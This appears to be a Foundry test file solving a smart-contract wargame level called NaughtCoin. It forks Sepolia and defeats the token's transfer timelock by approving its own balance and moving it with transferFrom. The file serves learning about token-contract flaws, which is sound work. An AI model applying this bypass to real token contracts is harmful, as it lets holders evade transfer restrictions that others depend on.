// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/15-NaughtCoin/NaughtCoin.sol";

contract ContractTest is Test {

    NaughtCoin level15 = NaughtCoin(payable(0xA5d633278a350B258699121364bAcC0820c09185));

    function setUp() public {
    //Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));

    }

    function testExploit15() public {
        address myWallet = address(this);
        uint myBal = level15.balanceOf(myWallet);
        console.log("Current balance is: ", myBal);

        level15.approve(myWallet, myBal);
        level15.transferFrom(myWallet, address(level15), myBal);

        console.log("New balance is: ", level15.balanceOf(myWallet));

    }
  receive() external payable {}
}

